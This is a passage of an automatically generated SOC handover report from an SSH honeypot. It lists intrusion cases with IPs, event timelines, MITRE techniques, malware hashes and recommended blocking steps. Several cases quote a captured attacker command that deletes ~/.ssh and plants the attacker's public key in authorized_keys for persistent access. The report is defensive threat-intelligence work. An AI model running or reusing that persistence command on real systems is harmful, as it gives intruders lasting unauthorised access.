| `2026-06-05 09:28:58` | `cowrie.command.failed` |
| `2026-06-05 09:28:58` | `cowrie.log.closed` |
| `2026-06-05 09:28:58` | `cowrie.session.params` |
| `2026-06-05 09:28:58` | `cowrie.command.input` |
| `2026-06-05 09:28:58` | `cowrie.session.file_download` |
| `2026-06-05 09:28:58` | `cowrie.log.closed` |
| `2026-06-05 09:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71252c7f2b5

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:29 |
| **Last Seen** | 2026-06-05 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:29:01` | `cowrie.session.connect` |
| `2026-06-05 09:29:01` | `cowrie.client.version` |
| `2026-06-05 09:29:01` | `cowrie.client.kex` |
| `2026-06-05 09:29:01` | `cowrie.login.success` |
| `2026-06-05 09:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f184dabaa07

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:31 |
| **Last Seen** | 2026-06-05 09:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:31:37` | `cowrie.session.connect` |
| `2026-06-05 09:31:37` | `cowrie.client.version` |
| `2026-06-05 09:31:38` | `cowrie.client.kex` |
| `2026-06-05 09:31:39` | `cowrie.login.success` |
| `2026-06-05 09:31:39` | `cowrie.session.params` |
| `2026-06-05 09:31:39` | `cowrie.command.input` |
| `2026-06-05 09:31:39` | `cowrie.command.failed` |
| `2026-06-05 09:31:40` | `cowrie.log.closed` |
| `2026-06-05 09:31:40` | `cowrie.session.params` |
| `2026-06-05 09:31:40` | `cowrie.command.input` |
| `2026-06-05 09:31:40` | `cowrie.session.file_download` |
| `2026-06-05 09:31:40` | `cowrie.log.closed` |
| `2026-06-05 09:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26cc3aa514e0

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:31 |
| **Last Seen** | 2026-06-05 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:31:43` | `cowrie.session.connect` |
| `2026-06-05 09:31:43` | `cowrie.client.version` |
| `2026-06-05 09:31:43` | `cowrie.client.kex` |
| `2026-06-05 09:31:45` | `cowrie.login.success` |
| `2026-06-05 09:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e2ec46043c

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:38 |
| **Last Seen** | 2026-06-05 09:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:38:06` | `cowrie.session.connect` |
| `2026-06-05 09:38:06` | `cowrie.client.version` |
| `2026-06-05 09:38:06` | `cowrie.client.kex` |
| `2026-06-05 09:38:07` | `cowrie.login.success` |
| `2026-06-05 09:38:07` | `cowrie.session.params` |
| `2026-06-05 09:38:07` | `cowrie.command.input` |
| `2026-06-05 09:38:07` | `cowrie.command.failed` |
| `2026-06-05 09:38:07` | `cowrie.log.closed` |
| `2026-06-05 09:38:08` | `cowrie.session.params` |
| `2026-06-05 09:38:08` | `cowrie.command.input` |
| `2026-06-05 09:38:08` | `cowrie.session.file_download` |
| `2026-06-05 09:38:08` | `cowrie.log.closed` |
| `2026-06-05 09:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fc31a3ebaf

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:38 |
| **Last Seen** | 2026-06-05 09:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:38:10` | `cowrie.session.connect` |
| `2026-06-05 09:38:10` | `cowrie.client.version` |
| `2026-06-05 09:38:10` | `cowrie.client.kex` |
| `2026-06-05 09:38:11` | `cowrie.login.success` |
| `2026-06-05 09:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d916a63aa33b

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:42 |
| **Last Seen** | 2026-06-05 09:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:42:39` | `cowrie.session.connect` |
| `2026-06-05 09:42:39` | `cowrie.client.version` |
| `2026-06-05 09:42:40` | `cowrie.client.kex` |
| `2026-06-05 09:42:40` | `cowrie.login.success` |
| `2026-06-05 09:42:41` | `cowrie.session.params` |
| `2026-06-05 09:42:41` | `cowrie.command.input` |
| `2026-06-05 09:42:41` | `cowrie.command.failed` |
| `2026-06-05 09:42:41` | `cowrie.log.closed` |
| `2026-06-05 09:42:41` | `cowrie.session.params` |
| `2026-06-05 09:42:41` | `cowrie.command.input` |
| `2026-06-05 09:42:41` | `cowrie.session.file_download` |
| `2026-06-05 09:42:41` | `cowrie.log.closed` |
| `2026-06-05 09:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e995f4e8982

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:42 |
| **Last Seen** | 2026-06-05 09:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:42:44` | `cowrie.session.connect` |
| `2026-06-05 09:42:44` | `cowrie.client.version` |
| `2026-06-05 09:42:44` | `cowrie.client.kex` |
| `2026-06-05 09:42:44` | `cowrie.login.success` |
| `2026-06-05 09:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `121.227.152[.]171` | **31** | 2026-06-05 08:27 | 2026-06-05 08:45 | 53m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.64.242[.]249` | **31** | 2026-06-05 08:30 | 2026-06-05 08:48 | 42m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.197.186[.]7` | **30** | 2026-06-05 08:29 | 2026-06-05 09:47 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.208.7[.]216` | **30** | 2026-06-05 08:29 | 2026-06-05 09:31 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.30.142[.]212` | **25** | 2026-06-05 05:27 | 2026-06-05 05:32 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.216.145[.]2` | **20** | 2026-06-05 04:08 | 2026-06-05 04:47 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]70` | **20** | 2026-06-05 06:30 | 2026-06-05 07:09 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.167.53[.]56` | **5** | 2026-06-05 04:29 | 2026-06-05 07:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]198` | **3** | 2026-06-05 07:36 | 2026-06-05 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.222.156[.]64` | **2** | 2026-06-05 09:20 | 2026-06-05 09:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.15.164[.]68` | **2** | 2026-06-05 04:07 | 2026-06-05 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `222.223.62[.]8` | **2** | 2026-06-05 04:06 | 2026-06-05 04:08 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]35` | **2** | 2026-06-05 07:36 | 2026-06-05 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.222[.]229` | 1 | 2026-06-05 05:35 | 2026-06-05 05:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]156` | 1 | 2026-06-05 08:39 | 2026-06-05 08:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.141.138[.]44` | 1 | 2026-06-05 04:50 | 2026-06-05 04:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.96.193[.]72` | 1 | 2026-06-05 09:44 | 2026-06-05 09:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.46.204[.]235` | 1 | 2026-06-05 04:58 | 2026-06-05 05:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.178[.]142` | 1 | 2026-06-05 08:36 | 2026-06-05 08:36 | 27s | 0 | `T1592` | 🟢 LOW |
| `14.103.218[.]183` | 1 | 2026-06-05 08:49 | 2026-06-05 08:51 | 96s | 0 | `T1592` | 🟢 LOW |
| `154.18.197[.]35` | 1 | 2026-06-05 08:38 | 2026-06-05 08:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `163.53.168[.]23` | 1 | 2026-06-05 04:50 | 2026-06-05 04:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.104.143[.]176` | 1 | 2026-06-05 05:22 | 2026-06-05 05:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]93` | 1 | 2026-06-05 07:13 | 2026-06-05 07:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `179.184.160[.]50` | 1 | 2026-06-05 06:31 | 2026-06-05 06:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.177.77[.]228` | 1 | 2026-06-05 06:14 | 2026-06-05 06:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `185.193.240[.]246` | 1 | 2026-06-05 05:03 | 2026-06-05 05:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.150.107[.]244` | 1 | 2026-06-05 04:52 | 2026-06-05 04:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.146.80[.]124` | 1 | 2026-06-05 07:25 | 2026-06-05 07:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.221.38[.]226` | 1 | 2026-06-05 09:33 | 2026-06-05 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]212` | 1 | 2026-06-05 06:29 | 2026-06-05 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]66` | 1 | 2026-06-05 04:07 | 2026-06-05 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]184` | 1 | 2026-06-05 07:35 | 2026-06-05 07:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]237` | 1 | 2026-06-05 08:22 | 2026-06-05 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.90.241[.]209` | 1 | 2026-06-05 08:38 | 2026-06-05 08:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.247.88[.]103` | 1 | 2026-06-05 08:50 | 2026-06-05 08:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.222.136[.]218` | 1 | 2026-06-05 09:49 | 2026-06-05 09:50 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.186.220[.]100` | 1 | 2026-06-05 07:59 | 2026-06-05 07:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `72.167.53[.]56` | US | GoDaddy.com, LLC | **100** ⚠️ | 2 |
| `91.186.220[.]100` | FI | FIRST SERVER, SOCIEDAD LIMITADA | **100** ⚠️ | 1 |
| `120.46.204[.]235` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 15 |
| `35.208.7[.]216` | US | Google LLC | **100** ⚠️ | 14 |
| `179.184.160[.]50` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 2 |
| `66.132.172[.]198` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `18.222.156[.]64` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `163.53.168[.]23` | CN | Guangdong LITONG Network Technology Limited | **100** ⚠️ | 50 |
| `176.65.148[.]93` | NL | Pfcloud UG | **100** ⚠️ | 24 |
| `203.150.107[.]244` | TH | Reserved for Broadband Plus | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 244 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 62 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 33 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 32 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 303 cases |
| Tool 34  | Credential Extractor        | ✅ 182 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 49 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 62 priority case(s) shown individually · 38 recon entry/entries in table (13 group(s) consolidating 203 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-05T09:58:50Z_
